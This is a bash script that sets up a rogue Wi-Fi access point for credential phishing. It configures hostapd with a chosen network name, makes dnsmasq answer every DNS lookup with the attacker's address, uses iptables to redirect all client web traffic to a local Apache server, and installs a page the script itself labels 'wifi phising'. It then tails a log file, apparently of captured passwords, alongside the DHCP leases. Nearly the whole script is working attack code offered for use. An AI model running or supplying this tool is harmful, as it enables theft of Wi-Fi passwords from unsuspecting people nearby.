#!/bin/bash
#variable 1 = wifi device
#variable 2 = internet device
[ $# -eq 0 ] && { echo "usage: wifi.sh [wireless-device] [AP network name]"; exit 1; }
wifi="$1"

cat <<EOF
__________                                     __      __.__  _____         .___    .___
\______   \ ____  __ __  ____   ____          /  \    /  \__|/ ____\_ __    |   | __| _/
 |       _//  _ \|  |  \/ ___\_/ __ \         \   \/\/   /  \   __\  |  \   |   |/ __ |
 |    |   (  <_> )  |  / /_/  >  ___/          \        /|  ||  | |  |  /   |   / /_/ |
 |____|_  /\____/|____/\___  / \___  >__________\__/\  / |__||__| |____/ /\ |___\____ |
        \/            /_____/      \/_____/_____/    \/                  \/          \/ JustHumanz

humanz@justhumanz.me
EOF
if [[ $EUID -ne 0 ]]; then
   echo "You not root,use sudo"
   exit 1
fi
control_c()
{
  echo -e "\e[91mCTRL C Detected!\n"
  cleanup $wifi
  echo -e "\e[91mExiting!"
  exit $?
}
function cleanup() {
	echo -en "\n###Caught SIGINT; Cleaning up and exiting\n"
	local x="$1" #x = wlan0
	echo -e "\e[32m###Restoring hostapd.conf"
	if [ -f /etc/hostapd/hostapd.BAK ]; then mv /etc/hostapd/hostapd.BAK /etc/hostapd/hostapd.conf; fi
	sleep 1
	echo -e "\e[32m###Restoring dnsmasq.conf"
	if [ -f /etc/dnsmasq.BAK ]; then mv /etc/dnsmasq.BAK /etc/dnsmasq.conf; fi
	sleep 1
	echo -e "\e[32m###Restoring iptables"
	iptables -t mangle -D PREROUTING -i $x -p udp --dport 53 -j RETURN
	iptables -t mangle -D PREROUTING -i $x -j captiveportal
	iptables -t mangle -D captiveportal -j MARK --set-mark 1
	iptables -t nat -D PREROUTING -i $x  -p tcp -m mark --mark 1 -j DNAT --to-destination 10.0.0.1
	iptables -D FORWARD -i $x -j ACCEPT
	iptables -t nat -F
	iptables -t nat -X
	iptables -t mangle -F
	iptables -t mangle -X
  echo -e "\e[32m###Delete ip wlan0"
  ifconfig $1 0.0.0.0
	sleep 1
	echo -e "\e[32m###Killing dnsmasq"
	pkill dnsmasq
	sleep 1
	echo -e "\e[32m###Killing hostapd"
	pkill hostapd
  sleep 1
  echo -e "\e[32m###Killing apache"
  if [[ -f /etc/pacman.conf ]]; then
    systemctl stop httpd
  elif [[ -f /etc/apt/sources.list ]]; then
    systemctl stop apache2
  elif [[ -f /etc/yum.conf ]]; then
    systemctl stop httpd
  fi
  echo -e "\e[32m###Make backup log and clean log"
  sleep 1
  if [[ -f /etc/pacman.conf ]]; then
    cp /srv/http/log.txt /srv/http/log.txt.old && echo '' > /var/lib/misc/dnsmasq.leases
  elif [[ -f /etc/apt/sources.list ]]; then
    cp /var/www/html/log.txt /var/www/html/log.txt.old && echo '' > /var/lib/misc/dnsmasq.leases
  elif [[ -f /etc/yum.conf ]]; then
    cp /var/www/html/log.txt /var/www/html/log.txt.old && echo '' > /var/lib/misc/dnsmasq.leases
  fi
    exit $?
}
trap control_c SIGINT
echo -e "\e[32m###Checking OS and install dependency"
if [[ -f /etc/pacman.conf ]]; then
  sudo pacman -Syyu && sudo pacman -S hostapd dnsmasq apache iptables net-tools-y
elif [[ -f /etc/apt/sources.list ]]; then
  sudo apt-get update -y && sudo apt-get install hostapd dnsmasq apache2 php libapache2-mod-php net-tools -y && sudo systemctl stop systemd-resolved && echo "nameserver 1.1.1.1" > /etc/resolv.conf
elif [[ -f /etc/yum.conf ]]; then
  sudo yum update && sudo yum install epel-release hostapd dnsmasq httpd php php-opcache net-tools -y
else
  echo "your distro not found"
  exit 0
fi

echo -e "\e[32m###Backing up/Creating hostapd.conf"
if [ -f /etc/hostapd/hostapd.conf ]; then mv /etc/hostapd/hostapd.conf /etc/hostapd/hostapd.BAK; fi
echo -e "interface=$1\ndriver=nl80211\nssid=$2\nhw_mode=g\nchannel=6\nignore_broadcast_ssid=0" > /etc/hostapd/hostapd.conf
sleep 1
echo -e "\e[32m###Backing up/Creating dnsmasq.conf"
if [ -f /etc/dnsmasq.conf ]; then mv /etc/dnsmasq.conf /etc/dnsmasq.BAK; fi
echo -e "no-resolv\ninterface=$1\ndhcp-range=10.0.0.2,10.0.0.101,12h\nserver=8.8.8.8\nserver=8.8.4.4\naddress=/#/10.0.0.1" > /etc/dnsmasq.conf
sleep 1
echo -e "\e[32m###Adding routes to iptables"
iptables -t mangle -N captiveportal
iptables -t mangle -A PREROUTING -i $1 -p udp --dport 53 -j RETURN
iptables -t mangle -A PREROUTING -i $1 -j captiveportal
iptables -t mangle -A captiveportal -j MARK --set-mark 1
iptables -t nat -A PREROUTING -i $1  -p tcp -m mark --mark 1 -j DNAT --to-destination 10.0.0.1
sysctl -w net.ipv4.ip_forward=1
iptables -A FORWARD -i $1 -j ACCEPT
echo -e "\e[32m###Configuring $1 "
ifconfig $1 up 10.0.0.1 netmask 255.255.255.0

if [[ -f /etc/pacman.conf ]]; then
  echo -e "\e[32m###Copy wifi phising to apache directory"
  if [[ -f /srv/http/humanz.php ]]; then
    echo -e "\e[32m###file already exists"
  else
    sudo cp -r html/* /srv/http/
    chmod 777 /srv/http/log.txt
  fi
  echo -e "\e[32m###Starting http"
  systemctl start httpd

elif [[ -f /etc/apt/sources.list ]]; then
  echo -e "\e[32m###Copy wifi phising to apache directory"
  if [[ -f /var/www/html/humanz.php ]]; then
    echo -e "\e[32m###file already exists"
  else
    sudo cp -r html /var/www/
    chmod 777 /var/www/html/log.txt
  fi
  echo -e "\e[32m###Starting http"
  systemctl start apache2

elif [[ -f /etc/yum.conf ]]; then
  echo -e "\e[32m###Copy wifi phising to apache directory"
  if [[ -f /var/www/html/humanz.php ]]; then
    echo -e "\e[32m###file already exists"
  else
    sudo cp -r html /var/www/
    chmod 777 /var/www/html/log.txt
  fi
  echo -e "\e[32m###Starting http"
  systemctl start httpd
fi

echo -e "\e[32m###Turning on dnsmasq"
if [ -z "$(ps -e | grep dnsmasq)" ]
  then
    dnsmasq &
  fi
sleep 1
echo -e "\e[32m###Starting hostapd"
hostapd -B /etc/hostapd/hostapd.conf 1> /dev/null
echo -e "\e[32m###View Log"
if [[ -f /etc/pacman.conf ]]; then
  tail -f /srv/http/log.txt /var/lib/misc/dnsmasq.leases
elif [[ -f /etc/apt/sources.list ]]; then
  tail -f /var/www/html/log.txt /var/lib/misc/dnsmasq.leases
elif [[ -f /etc/yum.conf ]]; then
  tail -f /var/www/html/log.txt /var/lib/misc/dnsmasq.leases
fi
while true; do read x; done
